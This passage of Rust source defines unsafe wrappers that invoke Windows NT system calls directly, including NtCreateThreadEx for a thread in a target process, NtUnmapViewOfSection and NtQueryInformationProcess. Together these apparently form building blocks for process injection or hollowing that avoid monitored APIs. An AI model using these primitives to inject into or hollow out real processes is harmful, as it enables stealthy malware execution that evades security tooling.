        status
    }

    pub unsafe fn terminate_process(&self, process: usize, exit_status: u32) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall2(self.terminate_process, process, exit_status as usize);
        compiler_fence(Ordering::SeqCst);
        status
    }

    /// `timeout_100ns`: negative = relative (e.g. -(ms * 10_000)).
    pub unsafe fn wait_for_single_object(
        &self,
        handle: usize,
        alertable: u32,
        timeout_100ns: *const i64,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall3(
            self.wait_for_single_object,
            handle,
            alertable as usize,
            timeout_100ns as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn query_information_process(
        &self,
        process: usize,
        class: u32,
        info: *mut c_void,
        length: u32,
        return_length: *mut u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall5(
            self.query_information_process,
            process,
            class as usize,
            info as usize,
            length as usize,
            return_length as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn unmap_view_of_section(&self, process: usize, base: usize) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall2(self.unmap_view_of_section, process, base);
        compiler_fence(Ordering::SeqCst);
        status
    }

    /// NtCreateThreadEx: object_attributes/attribute_list may be 0.
    /// `start_routine` runs as LPTHREAD_START_ROUTINE in the target process.
    #[allow(clippy::too_many_arguments)]
    pub unsafe fn create_thread_ex(
        &self,
        thread: *mut usize,
        desired_access: u32,
        object_attributes: usize,
        process: usize,
        start_routine: usize,
        argument: usize,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: usize,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall11(
            self.create_thread_ex,
            thread as usize,
            desired_access as usize,
            object_attributes,
            process,
            start_routine,
            argument,
            create_flags as usize,
            zero_bits,
            stack_size,
            maximum_stack_size,
            attribute_list,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    /// NtFreeVirtualMemory: base and region size are in/out pointers; for
    /// MEM_RELEASE the size in/out is 0.
    pub unsafe fn free_virtual_memory(
        &self,
        process: usize,
        base: *mut usize,
        region_size: *mut usize,
        free_type: u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall4(
            self.free_virtual_memory,
            process,
            base as usize,
            region_size as usize,
            free_type as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }
}
